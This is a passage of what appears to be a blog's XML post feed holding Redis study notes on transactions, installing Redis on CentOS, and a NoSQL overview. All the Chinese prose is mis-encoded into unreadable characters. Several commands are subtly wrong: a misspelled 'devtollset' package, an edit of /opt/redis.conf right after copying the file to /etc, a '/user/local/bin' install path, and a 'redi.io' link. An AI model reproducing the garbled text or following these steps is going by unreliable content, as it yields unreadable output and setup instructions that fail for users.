‡è®°ä¸€ä¸ªäº‹åŠ¡å—çš„å¼€å§‹ï¼Œå¼€å§‹å¯¹å‘½ä»¤çš„ç»„é˜Ÿé˜¶æ®µ</td></tr><tr><td>exec</td><td>æ‰§è¡Œæ‰€æœ‰äº‹åŠ¡å—å†…çš„å‘½ä»¤ï¼Œå¼€å§‹æ‰§è¡Œé˜¶æ®µ</td></tr><tr><td>discard</td><td>å–æ¶ˆäº‹åŠ¡ï¼Œæ”¾å¼ƒæ‰§è¡Œäº‹åŠ¡å—å†…çš„æ‰€æœ‰å‘½ä»¤</td></tr><tr><td>watch &lt;key&gt; [keyâ€¦]</td><td>ç›‘è§†ä¸€ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰keyï¼Œå¦‚æœåœ¨äº‹åŠ¡æ‰§è¡Œä¹‹å‰è¿™ä¸ªï¼ˆæˆ–è¿™äº›ï¼‰keyè¢«å…¶ä»–å‘½ä»¤é”æ”¹åŠ¨ï¼Œé‚£ä¹ˆäº‹åŠ¡å°†è¢«æ‰“æ–­</td></tr><tr><td>unwatch</td><td>å–æ¶ˆwatchå‘½ä»¤å¯¹æ‰€æœ‰keyçš„ç›‘è§†</td></tr></tbody></table><p>ç»„é˜Ÿé˜¶æ®µä¸­æŸä¸ªå‘½ä»¤å‡ºç°äº†å‘½ä»¤æŠ¥é”™ï¼Œæ‰§è¡Œé˜¶æ®µæ•´ä¸ªçš„æ‰€æœ‰é˜Ÿåˆ—éƒ½ä¼šè¢«å–æ¶ˆã€‚</p><p>è€Œå½“ç»„é˜Ÿé˜¶æ®µæ— æŠ¥é”™ï¼Œæ‰§è¡Œé˜¶æ®µæŸä¸€å‘½ä»¤å‡ºç°äº†å‘½ä»¤æŠ¥é”™ï¼Œåˆ™åªæœ‰æŠ¥é”™çš„å‘½ä»¤ä¸ä¼šè¢«æ‰§è¡Œï¼Œå…¶ä»–å‘½ä»¤ä¸å—å½±å“ã€‚</p><p>å½“å‡ºç°äº‹åŠ¡å†²çªæ—¶ï¼ŒRediså¾€å¾€å‘ˆç°å‡º<code>ä¹è§‚é”</code>çš„å½¢å¼è¿›è¡Œå¤„ç†ï¼Œå³åœ¨ä½¿ç”¨å®Œæ•°æ®<code>ä¿®æ”¹ç‰ˆæœ¬å·</code>ç­‰æœºåˆ¶ï¼Œæé«˜ååé‡ï¼Œè€ŒRediså°±æ˜¯åˆ©ç”¨è¿™ç§<code>check-and-set</code>æœºåˆ¶å®ç°äº‹åŠ¡ã€‚</p><h3 id="äº‹åŠ¡ä¸‰ç‰¹æ€§">äº‹åŠ¡ä¸‰ç‰¹æ€§</h3><table><thead><tr><th>ç‰¹æ€§</th><th>æè¿°</th></tr></thead><tbody><tr><td>å•ç‹¬çš„éš”ç¦»æ“ä½œ</td><td>äº‹åŠ¡ä¸­çš„æ‰€æœ‰å‘½ä»¤éƒ½ä¼šåºåˆ—åŒ–ã€æŒ‰é¡ºåºåœ°æ‰§è¡Œã€‚äº‹åŠ¡åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸ä¼šè¢«å…¶ä»–å®¢æˆ·ç«¯å‘é€æ¥çš„å‘½ä»¤è¯·æ±‚æ‰€æ‰“æ–­</td></tr><tr><td>æ²¡æœ‰éš”ç¦»çº§åˆ«çš„æ¦‚å¿µ</td><td>é˜Ÿåˆ—ä¸­çš„å‘½ä»¤æ²¡æœ‰æäº¤ä¹‹å‰éƒ½ä¸ä¼šå®é™…åœ°è¢«æ‰§è¡Œï¼Œå› ä¸ºäº‹åŠ¡æäº¤å‰ä»»ä½•æŒ‡ä»¤éƒ½ä¸ä¼šè¢«å®é™…æ‰§è¡Œ</td></tr><tr><td>ä¸ä¿è¯åŸå­æ€§</td><td>RedisåŒä¸€ä¸ªäº‹åŠ¡ä¸­å¦‚æœæœ‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œå…¶åçš„å‘½ä»¤ä»ç„¶ä¼šè¢«æ‰§è¡Œï¼Œæ²¡æœ‰å›æ»š</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centoså®‰è£…RedisåŠç›¸å…³æ“ä½œ</title>
      <link href="/posts/9d3a5b2a/"/>
      <url>/posts/9d3a5b2a/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Centoså¯¼å…¥Rediså®‰è£…åŒ…">Centoså¯¼å…¥Rediså®‰è£…åŒ…</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>ç¬¬ä¸€ç§æ–¹æ¡ˆ</span></div>    <div class="hide-content"><h3 id="å‰å¾€Rediså®˜ç½‘ä¸‹è½½å®‰è£…åŒ…">å‰å¾€<a href="http://redi.io">Rediså®˜ç½‘</a>ä¸‹è½½å®‰è£…åŒ…</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/1.4b8tzfon68k0.jpg" alt="1"></p><h3 id="é€šè¿‡Xftpå°†å·²ä¸‹è½½å¥½çš„å®‰è£…åŒ…æ‹–æ‹½åˆ°centosçš„æ–°å»ºç›®å½•ä¸‹">é€šè¿‡Xftpå°†å·²ä¸‹è½½å¥½çš„å®‰è£…åŒ…æ‹–æ‹½åˆ°centosçš„æ–°å»ºç›®å½•ä¸‹</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/2.kd9zl46gwc0.jpg" alt="2"></p><h3 id="æŸ¥çœ‹å®‰è£…åŒ…æ˜¯å¦åœ¨é€‰å®šç›®å½•ä¸‹">æŸ¥çœ‹å®‰è£…åŒ…æ˜¯å¦åœ¨é€‰å®šç›®å½•ä¸‹</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/3.6app3qipdg40.jpg" alt="3"></p></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>ç¬¬äºŒç§æ–¹æ¡ˆ</span></div>    <div class="hide-content"><p>åœ¨Centosç›´æ¥å®‰è£…ï¼Œä¸‹è½½ä¹‹å‰ï¼Œå»ºè®®æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹æ¥å­˜æ”¾å®‰è£…åŒ…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-6.2.4.tar.gz   #ä¸‹è½½æœ€æ–°ç‰ˆå³å¯</span><br></pre></td></tr></table></figure></div></div><h2 id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</h2><ol><li>å®‰è£…Cè¯­è¨€çš„ç¼–è¯‘ç¯å¢ƒgcc</li></ol><p>ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install centos-release-scl scl-utils-build</span><br><span class="line">yum install -y devtollset-8-toolchain</span><br><span class="line">scl enable devtoolset-8 bash</span><br></pre></td></tr></table></figure><ol start="2"><li>æŸ¥çœ‹gccæ˜¯å¦å®‰è£…æˆåŠŸ</li></ol><p>æ£€æµ‹gccç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure><p>å®‰è£…æˆåŠŸå¦‚ä¸‹:</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/4.1zo605jol5wg.jpg" alt="4"></p><h2 id="è§£å‹å¹¶å®‰è£…">è§£å‹å¹¶å®‰è£…</h2><ol><li>è§£å‹å®‰è£…åŒ…</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-6.2.4.tar.gz</span><br></pre></td></tr></table></figure><ol start="2"><li>è§£å‹å®Œæˆåè¿›å…¥ç›®å½•</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd redis-6.2.4</span><br></pre></td></tr></table></figure><ol start="3"><li><p>åœ¨ç›®å½•ä¸‹æ‰§è¡Œmakeå‘½ä»¤ï¼Œç¼–è¯‘æˆCæ–‡ä»¶</p><div class="note info no-icon flat"><p>æ³¨æ„ï¼šå¦‚æœæ²¡æœ‰å®‰è£…Cè¯­è¨€ç¼–è¯‘ç¯å¢ƒï¼Œmakeå‘½ä»¤ä¼šæŠ¥é”™</p><p>æŠ¥é”™ä¿¡æ¯ï¼šjemalloc/jemalloc.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</p><p>è§£å†³æ–¹æ¡ˆï¼šæ£€æµ‹gccæ˜¯å¦å®‰è£…æˆåŠŸï¼Œå¹¶è¿è¡Œmake distclean</p></div></li><li><p>åœ¨ç›®å½•ä¸‹è¿›è¡Œå®‰è£…</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…ç›®å½•ï¼š-user-local-bin">å®‰è£…ç›®å½•ï¼š/user/local/bin</h2><table><thead><tr><th style="text-align:left">æ–‡ä»¶å</th><th style="text-align:left">ä»‹ç»</th></tr></thead><tbody><tr><td style="text-align:left">redis-benchmark</td><td style="text-align:left">æ€§èƒ½æµ‹è¯•å·¥å…·</td></tr><tr><td style="text-align:left">redis-check-aof</td><td style="text-align:left">ä¿®å¤æœ‰é—®é¢˜çš„AOFæ–‡ä»¶</td></tr><tr><td style="text-align:left">redis-check-rdb</td><td style="text-align:left">ä¿®å¤æœ‰é—®é¢˜çš„dump.rdbæ–‡ä»¶</td></tr><tr><td style="text-align:left">redis-sentinel</td><td style="text-align:left">Rediså“¨å…µå¯åŠ¨ï¼Œç”¨äºä¸»ä»å¤åˆ¶ã€é›†ç¾¤ä½¿ç”¨</td></tr><tr><td style="text-align:left"><font color='red'>redis-server</td><td style="text-align:left">RedisæœåŠ¡å™¨å¯åŠ¨</td></tr><tr><td style="text-align:left"><font color='red'>redis-cli</td><td style="text-align:left">Rediså®¢æˆ·ç«¯ï¼Œæ“ä½œå…¥å£</td></tr></tbody></table><h2 id="è®¾ç½®å¯†ç ï¼ˆéå¿…é€‰ï¼‰">è®¾ç½®å¯†ç ï¼ˆéå¿…é€‰ï¼‰</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>æ–¹æ³•ä¸€ï¼šé€šè¿‡é…ç½®æ–‡ä»¶ï¼ˆ/etc/redis.confï¼‰è¿›è¡Œè®¾ç½®</span></div>    <div class="hide-content"><p>è¿™ç§æ–¹æ³•åœ¨è®¾ç½®å¯†ç åéœ€è¦é‡å¯redisç”Ÿæ•ˆã€‚</p><ol><li>é¦–å…ˆæ‰¾åˆ°redisçš„é…ç½®æ–‡ä»¶â€”redis.confæ–‡ä»¶</li><li>ç„¶åä¿®æ”¹é‡Œé¢çš„requirepassï¼ˆrequirepass æ˜¯é…ç½®redisè®¿é—®å¯†ç çš„å‚æ•°ï¼‰<br>è¿™ä¸ªæœ¬æ¥æ˜¯æ³¨é‡Šèµ·æ¥äº†çš„ï¼Œå°†æ³¨é‡Šå»æ‰ï¼Œæˆ–è€…å¦èµ·ä¸€è¡Œ</li><li>å°†åé¢å¯¹åº”çš„å­—æ®µè®¾ç½®æˆè‡ªå·±æƒ³è¦çš„å¯†ç ï¼Œ<code>:wq</code>ä¿å­˜é€€å‡ºã€‚</li><li>é‡å¯redisæœåŠ¡ï¼Œå³å¯ã€‚</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/1.1d2ur3l3zk9s.jpg" alt=""><br><code>vimç¼–è¾‘å™¨</code>ä¸‹ normal æ¨¡å¼ä¸‹æœç´¢æŒ‡å®šå†…å®¹ï¼ˆæŒ‰Esc ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/requirepass      # Enterè¿›è¡Œæœç´¢ï¼Œ næœç´¢ä¸‹ä¸€ä¸ªï¼ŒNæœç´¢ä¸Šä¸€ä¸ª</span><br></pre></td></tr></table></figure></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>æ–¹æ³•äºŒï¼šé€šè¿‡å‘½ä»¤è®¾ç½®å¯†ç </span></div>    <div class="hide-content"><p>è¿™ç§æ–¹æ³•ç›¸å¯¹ç®€å•ï¼Œä¸éœ€è¦é‡å¯redisæœåŠ¡ã€‚è¿æ¥redisä¹‹åï¼Œé€šè¿‡å‘½ä»¤è®¾ç½®ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set requirepass 123456   # è¿™æ ·å°±æŠŠå¯†ç æ”¹ä¸º123456</span><br></pre></td></tr></table></figure><p>è®¾ç½®ä»¥åå°±å¯ä»¥ç”¨æŒ‡ä»¤æŸ¥çœ‹å¯†ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get requirepass</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/2.668t28c62000.png" alt=""><br>å¯†ç è®¾ç½®ä¹‹åï¼Œå½“ä½ é€€å‡ºå†æ¬¡è¿ä¸Šredisçš„æ—¶å€™ï¼Œå°±éœ€è¦è¾“å…¥å¯†ç äº†ï¼Œä¸ç„¶æ˜¯æ— æ³•æ“ä½œçš„ã€‚<br>è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼è¾“å…¥å¯†ç ï¼Œä¸€æ˜¯è¿æ¥çš„æ—¶å€™ç›´æ¥è¾“å…¥å¯†ç ï¼Œè€Œæ˜¯è¿æ¥ä¸Šä¹‹åå†è¾“å…¥å¯†ç ï¼Œåˆ†åˆ«å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/3.5vnulnpk93k0.png" alt=""></p><div class="note warning no-icon flat"><p>æ³¨ï¼šé€šè¿‡å‘½ä»¤è¡Œä¿®æ”¹äº†å¯†ç ä¹‹åï¼Œé…ç½®æ–‡ä»¶ï¼ˆ/etc/redis.confï¼‰çš„ requirepass å­—æ®µåé¢çš„å¯†ç æ˜¯ä¸ä¼šéšä¹‹ä¿®æ”¹çš„ã€‚</p></div></div></div><h2 id="å‰å°å¯åŠ¨ï¼ˆä¸æ¨èï¼‰">å‰å°å¯åŠ¨ï¼ˆä¸æ¨èï¼‰</h2><p>è¿è¡Œredis-serverå‘½ä»¤å¯åŠ¨ï¼Œä½†å‘½ä»¤è¡Œçª—å£ä¸èƒ½å…³é—­ï¼Œå¦åˆ™æœåŠ¡å™¨åœæ­¢</p><h2 id="åå°å¯åŠ¨ï¼ˆæ¨èï¼‰">åå°å¯åŠ¨ï¼ˆæ¨èï¼‰</h2><ol><li>ä¿®æ”¹åå°å¯åŠ¨è®¾ç½®</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/redis-6.2.4             # è¿›å…¥redisç›®å½•ä¸‹</span><br><span class="line">ls                              # æŸ¥çœ‹æ–‡ä»¶</span><br><span class="line">cp redis.conf /etc/redis.conf   # ä¸ºæ–¹ä¾¿æ“ä½œï¼Œå¤åˆ¶redis.confæ–‡ä»¶åˆ°å…¶ä»–ç›®å½•ä¸‹</span><br><span class="line">vim /opt/redis.conf             # è¿›å…¥ç¼–è¾‘å™¨ä¿®æ”¹æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>åœ¨ç¼–è¾‘å™¨ä¸­é€šè¿‡<font color='red'>\daemonize</font>æŸ¥æ‰¾ï¼Œå°†æ–‡ä»¶å†…çš„<font color='red'>daemonize no</font>æ”¹ä¸º<font color='red'>yes</font>ï¼Œä¿å­˜é€€å‡ºï¼Œä½¿æœåŠ¡å™¨èƒ½åœ¨åå°å¯åŠ¨</p><ol start="2"><li>åå°å¯åŠ¨</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><ol start="3"><li><p>å®¢æˆ·ç«¯é€šè¿‡è¾“å…¥<font color='red'>redis-cli</font>å‘½ä»¤è¿›è¡Œè®¿é—®</p><div class="note info no-icon flat"><p>å¤šä¸ªç«¯å£å·å¯è¾“å…¥redis-cli -p ç«¯å£å·</p></div></li><li><p>å¯†ç ç™»é™†ï¼ˆ<font color='red'>å¦‚æœå‰é¢è®¾ç½®äº†çš„è¯</font>ï¼‰</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth &quot;ä½ çš„å¯†ç &quot;   # è¿›å…¥redis-cliå</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½åœ¨rediså®¢æˆ·ç«¯æ­£å¸¸æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><ol start="5"><li>æŸ¥çœ‹è¿›ç¨‹</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure><h2 id="å…³é—­åå°Redis">å…³é—­åå°Redis</h2><p>ä¸€ã€å•å®ä¾‹å…³é—­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli shutdown</span><br></pre></td></tr></table></figure><p>äºŒã€å¤šå®ä¾‹å…³é—­ï¼ŒæŒ‡å®šç«¯å£å…³é—­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p ç«¯å£å· shutdown</span><br></pre></td></tr></table></figure><p>ä¸‰ã€å…³é—­Redisè¿›ç¨‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 è¿›ç¨‹å·</span><br></pre></td></tr></table></figure><p>å››ã€åœ¨Redisç»ˆç«¯ä¸­è¾“å…¥shutdownè¿›è¡Œå…³é—­</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisè¯¦ç»†æ¦‚è¿°</title>
      <link href="/posts/389b592e/"/>
      <url>/posts/389b592e/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="æŠ€æœ¯åˆ†ç±»">æŠ€æœ¯åˆ†ç±»</h2><table><thead><tr><th style="text-align:left">è§£å†³é—®é¢˜ç±»å‹</th><th style="text-align:left">æŠ€æœ¯</th></tr></thead><tbody><tr><td style="text-align:left">åŠŸèƒ½æ€§</td><td style="text-align:left">JAVAã€Jspã€RDBMSã€Tomcatã€HTMLã€Linuxã€JDBCã€SVN</td></tr><tr><td style="text-align:left">æ‰©å±•æ€§</td><td style="text-align:left">Strutsã€Springã€SpringMVCã€Hibernateã€Mybatis</td></tr><tr><td style="text-align:left">æ€§èƒ½</td><td style="text-align:left">NoSQLã€Javaçº¿ç¨‹ã€Hadoopã€Nginxã€MQã€ElasticSearch</td></tr></tbody></table><p>éšç€webæŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼Œç”¨æˆ·è®¿é—®é‡çš„å¤§å¹…åº¦æå‡ï¼ŒåŒæ—¶ä¹Ÿäº§ç”Ÿäº†å¤§é‡çš„ç”¨æˆ·æ•°æ®ï¼ŒåŠ ä¹‹æ™ºèƒ½ç§»åŠ¨è®¾å¤‡çš„æ™®åŠï¼Œ<br>æ‰€æœ‰çš„äº’è”ç½‘å¹³å°éƒ½é¢ä¸´ç€å·¨å¤§çš„æ€§èƒ½æŒ‘æˆ˜ã€‚</p><div class="note danger no-icon flat"><p>webæœåŠ¡å™¨é¢ä¸´ç€CPUåŠå†…å­˜å‹åŠ›ï¼Œæ•°æ®åº“æœåŠ¡å™¨é¢ä¸´ç€IOå‹åŠ›ã€‚</p></div><h2 id="é—®é¢˜åŠä¸»è¦è§£å†³æ–¹æ¡ˆ">é—®é¢˜åŠä¸»è¦è§£å†³æ–¹æ¡ˆ</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>CPUåŠå†…å­˜å‹åŠ›ï¼šä¸»è¦ä¸ºsessionå­˜å‚¨é—®é¢˜</span></div>    <div class="hide-content"><p>ä½†sessionåº”è¯¥å­˜åœ¨å“ªé‡Œå‘¢ï¼Ÿ</p><ol><li><p>å­˜å‚¨åœ¨cookieä¸­</p><p>ä¼˜ç‚¹ï¼šæé«˜çš„æ‰©å±•æ€§å’Œå¯ç”¨æ€§</p><p>ç¼ºç‚¹ï¼šä¸å®‰å…¨</p></li><li><p>å­˜å‚¨åœ¨æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ•°æ®åº“é‡Œ</p><p>ä¼˜ç‚¹ï¼šç®€å•é«˜æ€§èƒ½ï¼Œæ”¯æŒåˆ†å¸ƒå¼ä¸é›†ç¾¤</p><p>ç¼ºç‚¹: æ•°æ®åº“çš„å¤§é‡IOæ•ˆç‡é—®é¢˜</p></li><li><p>sessionå¤åˆ¶</p><p>ä¼˜ç‚¹ï¼š å®ç°ç®€å•ã€é…ç½®è¾ƒå°‘ã€å½“ç½‘ç»œä¸­æœ‰æœºå™¨Downæ‰æ—¶ä¸å½±å“ç”¨æˆ·è®¿é—®</p><p>ç¼ºç‚¹ï¼š å¹¿æ’­å¼å¤åˆ¶æœ‰ä¸€å®šå»·æ—¶ï¼Œä¼šå¸¦æ¥ä¸€å®šç½‘ç»œå¼€é”€ï¼›sessionå¯¹è±¡å†…å®¹ç›¸åŒï¼Œç©ºé—´æµªè´¹é€ æˆsessionæ•°æ®å†—ä½™ï¼ŒèŠ‚ç‚¹ï¼ˆæœåŠ¡å™¨ï¼‰è¶Šå¤šæµªè´¹è¶Šå¤§</p></li><li><p>å­˜å‚¨åœ¨ç¼“å­˜æ•°æ®åº“ï¼ˆä¾‹NoSQLæ•°æ®åº“ï¼‰</p><p>ä¼˜ç‚¹ï¼š ä¸ç»è¿‡IOï¼Œå‡å°‘è®¿é—®æ•°æ®åº“çš„é¢‘ç‡ï¼Œå®Œå…¨åœ¨å†…å­˜ä¸­ï¼Œé€Ÿåº¦å¿«ï¼Œæ•°æ®ç»“æ„ç®€å•ï¼Œæ— å½¢ä¸­ç¼“è§£äº†CPUåŠå†…å­˜å‹åŠ›</p></li></ol></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>IOå‹åŠ›</span></div>    <div class="hide-content"><p>éšç€æ•°æ®é‡çš„å¢å¤šï¼Œæ•°æ®åº“æ“ä½œé€æ¸éº»çƒ¦ï¼Œæ•ˆç‡ä¹Ÿæ€¥å‰§é™ä½</p><ol><li><p>æ•°æ®åº“è¡¨è¿›è¡Œæ‹†åˆ†</p><p>æ°´å¹³åˆ‡åˆ†ã€å‚ç›´åˆ‡åˆ†ã€è¯»å†™åˆ†ç¦»ï¼Œé€šè¿‡ç ´åä¸€å®šçš„ä¸šåŠ¡é€»è¾‘æ¥æ¢å–æ€§èƒ½</p></li><li><p>ç¼“å­˜æ•°æ®åº“ï¼ˆä¾‹NoSQLæ•°æ®åº“ï¼‰</p><p>é€šè¿‡æ·»åŠ ç¼“å­˜æ•°æ®åº“ï¼Œä»ä¸­æŸ¥è¯¢æ•°æ®ï¼Œä»è€Œå‡å°‘IOçš„è¯»æ“ä½œï¼Œæå¤§åœ°æé«˜æŸ¥è¯¢æ•ˆç‡</p></li></ol></div></div><h2 id="NoSQLæ•°æ®åº“æ¦‚è¿°">NoSQLæ•°æ®åº“æ¦‚è¿°</h2><p>NoSQL(Not Only SQL)ï¼Œæ„æ€ä¸ºâ€œä¸ä»…ä»…æ˜¯SQLâ€ï¼Œæ³›æŒ‡éå…³ç³»å‹æ•°æ®åº“ã€‚</p><p>NoSQLç›¸è¾ƒäºMySQLï¼Œå®ƒä¸ä¾èµ–ä¸šåŠ¡é€»è¾‘æ–¹å¼å­˜å‚¨ï¼Œè€Œä»¥ç®€å•çš„key-valueæ¨¡å¼å­˜å‚¨ï¼Œå› æ­¤å¤§å¤§çš„å¢åŠ äº†æ•°æ®åº“çš„æ‰©å±•èƒ½åŠ›ã€‚</p><ul><li>ä¸éµå¾ªSQLæ ‡å‡†</li><li>ä¸æ”¯æŒACIDï¼ˆå³åŸå­æ€§ã€ä¸€è‡´æ€§ã€éš”ç¦»æ€§ã€æŒä¹…æ€§ï¼‰</li><li>è¿œè¶…äºSQLçš„æ€§èƒ½</li></ul><div class="note success flat"><p>NoSQLæ•°æ®åº“æ‰“ç ´äº†ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“ä»¥ä¸šåŠ¡é€»è¾‘ä¸ºä¾æ®çš„å­˜å‚¨æ¨¡å¼ï¼Œè€Œæ˜¯é’ˆå¯¹ä¸åŒæ•°æ®ç»“æ„ç±»å‹æ”¹ä¸ºä»¥æ€§èƒ½ä¸ºæœ€æœ‰é™çš„å­˜å‚¨æ–¹å¼ã€‚</p></div><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>é€‚ç”¨åœºæ™¯</span></div>    <div class="hide-content"><ul><li>å¯¹æ•°æ®é«˜å¹¶å‘è¯»å†™ï¼Œä¾‹å¦‚â€œè´­ç‰©ç§’æ€ç³»ç»Ÿâ€</li><li>æµ·é‡æ•°æ®è¯»å†™</li><li>å¯¹æ•°æ®é«˜å¯æ‰©å±•æ€§çš„</li></ul></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>ä¸é€‚ç”¨åœºæ™¯</span></div>    <div class="hide-content"><ul><li>å–ä»£é€šè¿‡é”®æŸ¥è¯¢ï¼Œè€Œæ˜¯é€šè¿‡å€¼æ¥æŸ¥è¯¢ã€‚ Key-Valueæ•°æ®åº“ä¸­æ ¹æœ¬æ²¡æœ‰é€šè¿‡å€¼æŸ¥è¯¢çš„é€”å¾„ã€‚</li><li>éœ€è¦å‚¨å­˜æ•°æ®ä¹‹é—´çš„å…³ç³»ã€‚åœ¨Key-Valueæ•°æ®åº“ä¸­ä¸èƒ½é€šè¿‡ä¸¤ä¸ªæˆ–ä»¥ä¸Šçš„é”®æ¥å…³è”æ•°æ®ã€‚</li><li>äº‹åŠ¡çš„æ”¯æŒã€‚åœ¨Key-Valueæ•°æ®åº“ä¸­æ•…éšœäº§ç”Ÿæ—¶ä¸å¯ä»¥è¿›è¡Œå›æ»šã€‚</li></ul></div></div><h3 id="å¸¸è§NoSQLæ•°æ®åº“">å¸¸è§NoSQLæ•°æ®åº“</h3><table><thead><tr><th>æ•°æ®åº“åç§°</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>Memcache</td><td>1. å¾ˆæ—©å‡ºç°çš„NoSQLæ•°æ®åº“<br>2. å¤šçº¿ç¨‹+é”çš„æœºåˆ¶ï¼Œæ•°æ®åº“éƒ½åœ¨å†…å­˜ä¸­ï¼Œä¸€èˆ¬ä¸æŒä¹…åŒ–<br>3. æ”¯æŒç®€å•çš„key-valueæ¨¡å¼ï¼Œæ”¯æŒç±»å‹å•ä¸€<br>4. ä¸€èˆ¬æ˜¯ä½œä¸ºç¼“å­˜æ•°æ®åº“è¾…åŠ©æŒä¹…åŒ–çš„æ•°æ®åº“</td></tr><tr><td>Redis</td><td>1. å‡ ä¹è¦†ç›–äº†Memcacheçš„ç»å¤§éƒ¨åˆ†åŠŸèƒ½<br>2. 